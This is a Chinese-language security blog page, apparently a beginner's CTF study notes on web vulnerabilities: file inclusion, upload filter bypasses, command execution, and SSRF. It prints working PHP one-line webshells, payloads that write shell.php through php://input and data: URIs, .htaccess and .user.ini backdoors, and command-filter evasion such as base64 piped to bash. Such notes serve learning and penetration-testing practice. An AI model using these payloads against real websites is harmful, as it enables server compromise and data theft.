@@ -1,0 +1,591 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Web基础漏洞 - Wking&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Wking&#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Wking&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="初学web时的基础漏洞知识：文件包含、文件上传、RCE、SSRF、CSRF"><meta property="og:type" content="blog"><meta property="og:title" content="Web基础漏洞"><meta property="og:url" content="https://wkingxc.com/2021/09/28/Web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"><meta property="og:site_name" content="Wking&#039;s Blog"><meta property="og:description" content="初学web时的基础漏洞知识：文件包含、文件上传、RCE、SSRF、CSRF"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://api2.mubu.com/v3/document_image/5393a52f-b373-4e3e-8ab6-f7ffe4d1ed64-10191865.jpg"><meta property="og:image" content="https://i.loli.net/2021/10/31/XLqch7GYfPtFJ1O.png"><meta property="og:image" content="https://api2.mubu.com/v3/document_image/2ceabea5-b6a4-46b6-b791-c39396a7cde8-10191865.jpg"><meta property="og:image" content="https://api2.mubu.com/v3/document_image/9d92c7b7-692a-4245-bb71-e28aae82ea48-10191865.jpg"><meta property="og:image" content="https://api2.mubu.com/v3/document_image/894f7bfb-df81-4091-bd7b-ef0076719340-10191865.jpg"><meta property="og:image" content="https://api2.mubu.com/v3/document_image/b2056527-0ac9-41ea-a4c7-5686aa631e44-10191865.jpg"><meta property="og:image" content="https://api2.mubu.com/v3/document_image/4cb6c028-a1a3-4564-b692-4d2c65ddcc7a-10191865.jpg"><meta property="og:image" content="https://api2.mubu.com/v3/document_image/8f8ca449-d18f-497b-b5da-e05dba2b1b5e-10191865.jpg"><meta property="og:image" content="https://api2.mubu.com/v3/document_image/e587b377-1752-445d-9285-bea15b567c22-10191865.jpg"><meta property="og:image" content="https://api2.mubu.com/v3/document_image/5206f57b-6a7a-434d-8e8c-dad04e71cfc1-10191865.jpg"><meta property="og:image" content="https://api2.mubu.com/v3/document_image/0ce1c2f7-5c82-45ee-bd84-14f0b7b569bb-10191865.jpg"><meta property="og:image" content="https://api2.mubu.com/v3/document_image/c39e8c8e-4ab9-4599-bf6b-de760df958cf-10191865.jpg"><meta property="article:published_time" content="2021-09-28T07:48:49.000Z"><meta property="article:modified_time" content="2023-04-03T07:48:49.000Z"><meta property="article:author" content="Wking"><meta property="article:tag" content="Web知识点"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://api2.mubu.com/v3/document_image/5393a52f-b373-4e3e-8ab6-f7ffe4d1ed64-10191865.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://wkingxc.com/2021/09/28/Web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"},"headline":"Web基础漏洞","image":["https://api2.mubu.com/v3/document_image/5393a52f-b373-4e3e-8ab6-f7ffe4d1ed64-10191865.jpg","https://i.loli.net/2021/10/31/XLqch7GYfPtFJ1O.png","https://api2.mubu.com/v3/document_image/2ceabea5-b6a4-46b6-b791-c39396a7cde8-10191865.jpg","https://api2.mubu.com/v3/document_image/9d92c7b7-692a-4245-bb71-e28aae82ea48-10191865.jpg","https://api2.mubu.com/v3/document_image/894f7bfb-df81-4091-bd7b-ef0076719340-10191865.jpg","https://api2.mubu.com/v3/document_image/b2056527-0ac9-41ea-a4c7-5686aa631e44-10191865.jpg","https://api2.mubu.com/v3/document_image/4cb6c028-a1a3-4564-b692-4d2c65ddcc7a-10191865.jpg","https://api2.mubu.com/v3/document_image/8f8ca449-d18f-497b-b5da-e05dba2b1b5e-10191865.jpg","https://api2.mubu.com/v3/document_image/e587b377-1752-445d-9285-bea15b567c22-10191865.jpg","https://api2.mubu.com/v3/document_image/5206f57b-6a7a-434d-8e8c-dad04e71cfc1-10191865.jpg","https://api2.mubu.com/v3/document_image/0ce1c2f7-5c82-45ee-bd84-14f0b7b569bb-10191865.jpg","https://api2.mubu.com/v3/document_image/c39e8c8e-4ab9-4599-bf6b-de760df958cf-10191865.jpg"],"datePublished":"2021-09-28T07:48:49.000Z","dateModified":"2023-04-03T07:48:49.000Z","author":{"@type":"Person","name":"Wking"},"publisher":{"@type":"Organization","name":"Wking's Blog","logo":{"@type":"ImageObject","url":"https://wkingxc.com/img/logo.png"}},"description":"初学web时的基础漏洞知识：文件包含、文件上传、RCE、SSRF、CSRF"}</script><link rel="canonical" href="https://wkingxc.com/2021/09/28/Web%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.png" alt="Wking&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">时间轴</a><a class="navbar-item" href="/categories">目录</a><a class="navbar-item" href="/friends">友链</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="GitHub" href="https://github.com/Wkingxc"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-09-28T07:48:49.000Z" title="2021/9/28 15:48:49">2021-09-28</time>发表</span><span class="level-item"><time dateTime="2023-04-03T07:48:49.000Z" title="2023/4/3 15:48:49">2023-04-03</time>更新</span><span class="level-item"><a class="link-muted" style="color:#1E90FF;" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span><span class="level-item">19 分钟读完 (大约2822个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">Web基础漏洞</h1><div class="content"><p>初学web时的基础漏洞知识：文件包含、文件上传、RCE、SSRF、CSRF</p>
+<span id="more"></span>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>常见的信息泄露：<a href="https://blog.csdn.net/a597934448/article/details/105431367"> CTFHUBWeb技能树——信息泄露</a></p>
+<p>robots.txt	.git	.phps	.svn	<a href="http://www.zip/">www.zip</a>	vim缓存泄露(.index.php.swp)	</p>
+<p>kindeditor的文件空间	php测试探针（tz.php)	backup.sql</p>
+<h2 id="一、文件包含漏洞"><a href="#一、文件包含漏洞" class="headerlink" title="一、文件包含漏洞"></a>一、文件包含漏洞</h2><ul>
+<li><p>一、常见函数漏洞点</p>
+<ul>
+<li><p>include()、include_once()、require()、require_once()</p>
+</li>
+<li><p>应用场景：</p>
+<ul>
+<li><p>具有相关文件包含函数</p>
+</li>
+<li><p>存在动态变量 <code>inlcude $file</code></p>
+</li>
+<li><p>攻击者能够控制该变量 例如：<code>$file=$_GET[&#39;file&#39;]</code></p>
+</li>
+<li><p>file page等参数</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>二、本地文件和远程文件包含漏洞    （<a href="https://www.cnblogs.com/appear001/p/11149996.html">相关链接</a>）</p>
+<ul>
+<li><p>本地文件</p>
+<ul>
+<li><p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞</p>
+</li>
+<li><p>常见敏感信息路径<img src="https://api2.mubu.com/v3/document_image/5393a52f-b373-4e3e-8ab6-f7ffe4d1ed64-10191865.jpg"></p>
+</li>
+</ul>
+</li>
+<li><p>远程文件</p>
+<ul>
+<li>服务器的php.ini的配置选项<code>allow_url_fopen</code>和<code>allow_url_include</code>为On，则include&#x2F;require函数式可加载远程文件</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>三、文件包含技巧之php伪协议包含</p>
+<ul>
+<li><p>类型</p>
+<ul>
+<li><p>file:&#x2F;&#x2F; 访问本地文件系统</p>
+</li>
+<li><p>http:&#x2F;&#x2F; 访问 HTTPs 网址</p>
+</li>
+<li><p>ftp:&#x2F;&#x2F; 访问 ftp URL</p>
+</li>
+<li><p>php:&#x2F;&#x2F; 访问输入输出流</p>
+</li>
+<li><p>phar:&#x2F;&#x2F; php归档</p>
+</li>
+<li><p>zlib:&#x2F;&#x2F; 压缩流</p>
+</li>
+<li><p>data:&#x2F;&#x2F; 数据</p>
+</li>
+<li><p>ssh2:&#x2F;&#x2F; security shell2</p>
+</li>
+<li><p>expect:&#x2F;&#x2F; 处理交互式的流</p>
+</li>
+<li><p>glob:&#x2F;&#x2F; 查找匹配的文件路径</p>
+</li>
+</ul>
+</li>
+<li><p>常用</p>
+<ul>
+<li><p><font color='red'>php:&#x2F;&#x2F;input</font></p>
+<p>它是个可以访问请求的原始数据的只读流，即获取post传过去的数据</p>
+<ul>
+<li><p>利用条件：allow_url_include &#x3D; on , fopen不做要求</p>
+<ul>
+<li>利用方式：<code>include.php?file=php://input</code>,之后再传POST数据</li>
+</ul>
+</li>
+<li><p>POST：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> 代码 <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>)) ; <span class="meta">?&gt;</span>  打印当前目录所有文件</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>);<span class="meta">?&gt;</span>  写入一句话木马文件</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;../../../flag&#x27;</span>); <span class="meta">?&gt;</span> 读取并显示文件</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;find / -name flag*&#x27;</span>); <span class="meta">?&gt;</span> 调用系统命令</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><font color='red'>data:URI schema</font> （可以绕过php字符）</p>
+<ul>
+<li>利用条件：php&gt;&#x3D;5.2,allow_url_include&#x2F;fopen&#x3D;on</li>
+<li>利用方式:<code>file=data:text/plain, 代码</code></li>
+<li><code>file=data:text/plain;base64,&lt;?php system(&#39;cat flag.php&#39;);</code></li>
+</ul>
+</li>
+<li><p><font color='red'>php:&#x2F;&#x2F;filter</font></p>
+<p>一般用它来读取源码，不过要先经过base64加密，得到结果后再解密</p>
+<ul>
+<li>利用方式:<code>=php://filter/read=convert.base64-encode/resource=文件名</code></li>
+<li><strong>常用来查看不被php解析显示的信息</strong></li>
+<li><code>php://filter/write=convert.base64-decode/resource=</code></li>
+<li>可以将base64的字符串解码后写入resource的文件里</li>
+</ul>
+</li>
+<li><p><font color='red'>phar:&#x2F;&#x2F;</font></p>
+<p>解析压缩包内的文件</p>
+<ul>
+<li><p>利用条件：php&gt;&#x3D;5.3.0</p>
+</li>
+<li><p>phar:&#x2F;&#x2F;shell.zip&#x2F;shell.txt</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>四、通过session文件包含getshell</p>
+<ul>
+<li><p>session简介</p>
+<ul>
+<li><p>cookie存在客户端，保存账号密码，session存在服务端，跟踪会话</p>
+</li>
+<li><p>一般对于登录点存在注册用户的，可以起一个为payload的名字，payload就会保存在session中</p>
+</li>
+</ul>
+</li>
+<li><p>利用条件：</p>
+<ul>
+<li><p>1、文件路径已知  可以通过phpinfo页面获取,session_save_path，或者猜测&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID 或 &#x2F;tmp&#x2F;sess_PHPSESSID</p>
+</li>
+<li><p>2、其中部分内容可控</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="二、文件上传漏洞-amp-基本绕过"><a href="#二、文件上传漏洞-amp-基本绕过" class="headerlink" title="二、文件上传漏洞&amp;基本绕过"></a>二、文件上传漏洞&amp;基本绕过</h2><p><strong>一句话木马的两种形式，当&lt;?php被过滤时，可以用第二种</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&quot;cmd&quot;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>一、文件上传漏洞绕过方式</p>
+<ul>
+<li><p><font color='red'>1、客户端验证</font><br>js脚本检验上传文件的后缀名，白名单&#x2F;黑名单形式，只在前端验证</p>
+</li>
+<li><p><font color='red'>2、服务端mime类型绕过</font></p>
+</li>
+<li><p>服务端通过<code>Content-Type</code>的值来判断文件类型</p>
+</li>
+<li><p>抓包后修改为 ，例如： image&#x2F;jpeg  image&#x2F;png等</p>
+</li>
+<li><p><font color='red'>3、00截断绕过</font></p>
+<ul>
+<li>条件：php版本在5.3之前 &amp;&amp; php参数设置里magic_quetos_gpc是关闭的</li>
+<li><code>%00</code> 将会截断后面的内容，代表字符串到此结束（注意get和filename都要修改）</li>
+</ul>
+</li>
+<li><p><font color='red'>4、文件头检验</font></p>
+<ul>
+<li>（1） .JPEG;.JPE;.JPG，”JPGGraphic File”</li>
+<li>（2） .gif，”GIF 89A” </li>
+<li>（3） .zip，”Zip Compressed”</li>
+<li>（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>二、黑名单检测绕过</p>
+<ul>
+<li><p><font color='red'>1、黑名单过滤不全</font></p>
+<ul>
+<li>修改后缀名例如：<ul>
+<li>php3 php4 php5 phtml</li>
+<li>jsp jspx jspf</li>
+<li>asp asa cer aspx</li>
+</ul>
+</li>
+<li>大小写过滤不全：PHP</li>
+</ul>
+</li>
+<li><p><font color='red'>2、上传.htaccess文件绕过</font></p>
+<p>该文件时Apache服务器中的一个配置文件，负责相关目录下的网页配置</p>
+<ul>
+<li><p>新建一个.htaccess文件内容为：SetHandler application&#x2F;x-httpd-php</p>
+</li>
+<li><p>再上传jpg文件，并打开即可解析</p>
+</li>
+</ul>
+</li>
+<li><p><font color='red'>3、空格和. 绕过</font></p>
+<ul>
+<li><p>在文件后面加上 空格或者点号</p>
+</li>
+<li><p>在文件后面加上 <code>. .</code>（点 空格 点）</p>
+</li>
+</ul>
+</li>
+<li><p><font color='red'>4、::$DATA绕过</font>     在文件后面加上::$DATA<br>基于Windows的NTFS文件流特性</p>
+</li>
+<li><p><font color='red'>5、双写绕过</font>——后缀名改为<code>pphphp</code></p>
+</li>
+<li><p><font color='red'>6、上传 .user.ini添加后门</font> <a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">.user.ini文件构成的PHP后门</a></p>
+<ul>
+<li><p>只要是以fastcgi运行的php都可以用这个方法</p>
+</li>
+<li><p><img src="https://i.loli.net/2021/10/31/XLqch7GYfPtFJ1O.png"></p>
+</li>
+<li><p><code>auto_prepend_file</code>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<code>auto_append_file</code>类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>三、图片木马利用</p>
+<ul>
+<li><p>使用条件</p>
+<ul>
+<li><p>1、需要结合文件包含漏洞</p>
+<ul>
+<li>目标网站存在该php漏洞，例如include.php，即可用&#x2F;include.php?file&#x3D;图片地址来实现webshell<img src="https://api2.mubu.com/v3/document_image/2ceabea5-b6a4-46b6-b791-c39396a7cde8-10191865.jpg"></li>
+</ul>
+</li>
+<li><p>2、配合解析漏洞利用</p>
+</li>
+</ul>
+</li>
+<li><p>制作图片木马 命令行方式：copy 1.jpg&#x2F;b+shell.php&#x2F;a muma.jpg</p>
+</li>
+<li><p>图片二次渲染绕过</p>
+<ul>
+<li><p>JPG二次渲染绕过</p>
+<ul>
+<li><p>先将图片上传后再下载下来保存在本地例如123.jpg</p>
+</li>
+<li><p>把该123.jpg和jpg_payload.php放入带有php环境的文件夹中</p>
+</li>
+<li><p>cmd执行：php jpg_payload.php 123.jpg 生成新的木马图片</p>
+</li>
+<li><p>上传后利用文件包含漏洞实现webshell</p>
+</li>
+</ul>
+</li>
+<li><p>GIF二次渲染绕过</p>
+<ul>
+<li><p>上传后再下载到本地</p>
+</li>
+<li><p>用010Editor进行前后对比，找出没有二次渲染的部分</p>
+</li>
+<li><p>在没有渲染的部分加入代码，并再次上传</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>四、几种解析漏洞</p>
+<ul>
+<li><p>IIS5.X&#x2F;6.0解析漏洞</p>
+<ul>
+<li><p>目录解析：&#x2F;xx.asp&#x2F;xx.jpg</p>
+<ul>
+<li>在网站下建立文件夹名称为.asp .asa的文件夹，目录内的任何文件都会被当作asp文件来解析并执行</li>
+</ul>
+</li>
+<li><p>文件解析：shell.asp;.jpg</p>
+<ul>
+<li>在IIS6.0下分号后面的不被解析，IIS6.0默认的可执行文件除了asp还包括：shell.asa&#x2F;.cer&#x2F;.cdx(黑检绕过)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>IIS 7.0&#x2F;7.5&#x2F; Ngnix&lt;8.03畸形解析漏洞</p>
+<ul>
+<li>在默认Fast_CGI开启下，上传一个名为shell.jpg的文件，内容为：</li>
+<li><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&#39;);?&gt;</code></li>
+<li>然后访问shell.jpg&#x2F;.php，就会生成shell.php文件</li>
+</ul>
+</li>
+<li><p>Ngnix空字节代码执行漏洞</p>
+<ul>
+<li><p>版本：0.5、0.6、0.7&lt;&#x3D;0.7.65 、0.8&lt;&#x3D;0.8.37</p>
+</li>
+<li><p>在图片中嵌入php代码后访问：<code>xxx.jpg%00.php</code>来执行代码</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="三、RCE"><a href="#三、RCE" class="headerlink" title="三、RCE"></a>三、RCE</h2><ul>
+<li><p>常见操作命令</p>
+<ul>
+<li><p>常见命令执行函数</p>
+<ul>
+<li>system()</li>
+<li>passthru()</li>
+<li>exec()</li>
+<li>shell_exec()</li>
+<li>&#96;反引号</li>
+<li>ob_start()</li>
+</ul>
+</li>
+<li><p>1.查看文件</p>
+<ul>
+<li><p><strong><font color='red'>linux查看文件命令</font></strong><img src="https://api2.mubu.com/v3/document_image/9d92c7b7-692a-4245-bb71-e28aae82ea48-10191865.jpg"></p>
+</li>
+<li><p><font color='red'>windows：type flag.txt</font></p>
+</li>
+</ul>
+</li>
+<li><p>2.查找文件</p>
+<ul>
+<li><p><a href="https://blog.csdn.net/xxmonstor/article/details/80507769">linux查找文件</a></p>
+</li>
+<li><p>find命令<img src="https://api2.mubu.com/v3/document_image/894f7bfb-df81-4091-bd7b-ef0076719340-10191865.jpg" alt="img"></p>
+</li>
+</ul>
+</li>
+<li><p>3.写入文件</p>
+<ul>
+<li>&gt;是覆写，&gt;&gt;是追加</li>
+</ul>
+</li>
+<li><p><code>echo &quot;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&quot;&gt;shell.php</code></p>
+</li>
+</ul>
+<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><ul>
+<li><p><font color='red'>1.管道符</font></p>
+<ul>
+<li><p>linux<img src="https://api2.mubu.com/v3/document_image/b2056527-0ac9-41ea-a4c7-5686aa631e44-10191865.jpg"></p>
+</li>
+<li><p>windows<img src="https://api2.mubu.com/v3/document_image/4cb6c028-a1a3-4564-b692-4d2c65ddcc7a-10191865.jpg"></p>
+</li>
+</ul>
+</li>
+<li><p><font color='red'>2.空格</font></p>
+<ul>
+<li><p>&lt;  重定向符 or &gt; &lt;&gt;</p>
+</li>
+<li><p>$IFS$9</p>
+</li>
+<li><p>%20</p>
+</li>
+<li><p>%09(需要php环境)</p>
+</li>
+</ul>
+</li>
+<li><p><font color='red'>3.前后缀</font></p>
+<ul>
+<li><p>%0a 换行符(php环境)</p>
+</li>
+<li><p>%00 截断</p>
+</li>
+<li><p>%20%23</p>
+</li>
+</ul>
+</li>
+<li><p><strong><font color='red'>4.黑名单绕过</font></strong></p>
+<ul>
+<li><p>1.拼接：a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag;$a$b $c$d</p>
+</li>
+<li><p>2.base64编码</p>
+<ul>
+<li><p>echo “Y2F0IGZsYWc&#x3D;”|base64 -d (该编码为cat)</p>
+</li>
+<li><p>echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash (在bash被过滤的情况下可尝试sh)</p>
+</li>
+</ul>
+</li>
+<li><p>3.单双引号：c””at fl’’ag</p>
+</li>
+<li><p>4.反斜线：c\at fl\ag</p>
+</li>
+<li><p>5.正则<img src="https://api2.mubu.com/v3/document_image/8f8ca449-d18f-497b-b5da-e05dba2b1b5e-10191865.jpg"></p>
+</li>
+</ul>
+</li>
+<li><p><font color='red'>5.其他技巧</font></p>
+<ul>
+<li><p>1.内联执行—就是将&#96;&#96;或$()内命令的输出作为输入执行</p>
+<ul>
+<li><p>cat$IFS$9`ls&#96;</p>
+</li>
+<li><p>cat$IFS$9$(ls)</p>
+</li>
+</ul>
+</li>
+<li><p>2.文件构造绕过</p>
+<p>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</p>
+<ul>
+<li><img src="https://api2.mubu.com/v3/document_image/e587b377-1752-445d-9285-bea15b567c22-10191865.jpg"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="四、SSRF-服务端请求构造"><a href="#四、SSRF-服务端请求构造" class="headerlink" title="四、SSRF(服务端请求构造)"></a>四、SSRF(服务端请求构造)</h2><ul>
+<li><p>SSRF（服务端请求伪造）</p>
+<p>一种构造请求，由服务端发起请求的安全漏洞</p>
+<ul>
+<li><p>漏洞原理</p>
+<ul>
+<li><p>服务端提供了从其他服务器获取数据的功能，但没有对内网目标地址做过滤和限制</p>
+</li>
+<li><p>主要方式：</p>
+</li>
+<li><p>1.对外网、服务器所在内网、本地进行端口扫描，获取Banner信息</p>
+</li>
+<li><p>2.测试运行在内网或本地的应用程序</p>
+</li>
+<li><p>3.利用file协议读取本地文件等</p>
+</li>
+</ul>
+</li>
+<li><p>漏洞代码分析</p>
+<ul>
+<li><img src="https://api2.mubu.com/v3/document_image/5206f57b-6a7a-434d-8e8c-dad04e71cfc1-10191865.jpg"></li>
+</ul>
+</li>
+<li><p>漏洞利用</p>
+<ul>
+<li><p><a href="https://www.cnblogs.com/-mo-/p/11673190.html">伪协议利用</a></p>
+<ul>
+<li><p>file:&#x2F;&#x2F;  – 本地文件传输协议，主要用于访问本地计算机中的文件</p>
+</li>
+<li><p>gopher:&#x2F;&#x2F; – 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前</p>
+</li>
+<li><p>dict:&#x2F;&#x2F;   – 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628</p>
+</li>
+<li><p>sftp:&#x2F;&#x2F;   – SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol）</p>
+</li>
+<li><p>ldap:&#x2F;&#x2F;   – 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议</p>
+</li>
+<li><p>tftp:&#x2F;&#x2F;   – 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机</p>
+</li>
+</ul>
+</li>
+<li><p>PHP函数</p>
+<ul>
+<li><p>file_get_contents()</p>
+</li>
+<li><p>fsockopen()</p>
+</li>
+<li><p>curl_exec()</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><font color='red'>gopher协议详解</font>—<a href="https://zhuanlan.zhihu.com/p/112055947">链接</a></p>
+<ul>
+<li><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p>
+</li>
+<li><p>gopher协议格式：URL:<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></p>
+</li>
+<li><p>gopher的默认端口是70</p>
+</li>
+<li><p>如果发起post请求，回车换行需要使用<code>%0d%0a</code>，如果多个参数，参数之间的<code>&amp;</code>也需要进行URL编码</p>
+</li>
+<li><p>发送HTTP请求<img src="https://api2.mubu.com/v3/document_image/0ce1c2f7-5c82-45ee-bd84-14f0b7b569bb-10191865.jpg"></p>
+</li>
+<li><p>注意事项<img src="https://api2.mubu.com/v3/document_image/c39e8c8e-4ab9-4599-bf6b-de760df958cf-10191865.jpg"></p>
+</li>
+</ul>
+</li>
+<li><p>IP绕过方式—<a href="https://zhuanlan.zhihu.com/p/73736127">链接</a></p>
+<ul>
+<li><p><code>locahost绕过</code>：攻击本地地址，过滤掉127.0.0.1的情况下，用locahost替代</p>
+</li>
+<li><p><code>利用@</code>：<a href="http://example.com@127.0.0.1/">http://example.com@127.0.0.1</a> 实际访问的是后面ip</p>
+</li>
+<li><p><code>进制转换绕过</code>，例如：127.0.0.1可以转换为：</p>
+<ul>
+<li>十六进制 &#x3D; 0x7F000001</li>
+<li>十进制 &#x3D; 2130706433</li>
+<li>十进制转换 八进制转换 十六进制转换  不同进制组合转换</li>
+</ul>
+</li>
+<li><p><code>利用句号</code>：127。0。0。1  &gt;&gt;&gt;  127.0.0.1</p>
+</li>
+<li><p><code>利用302跳转</code></p>
+<ul>
+<li><a href="http://xip.io/">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
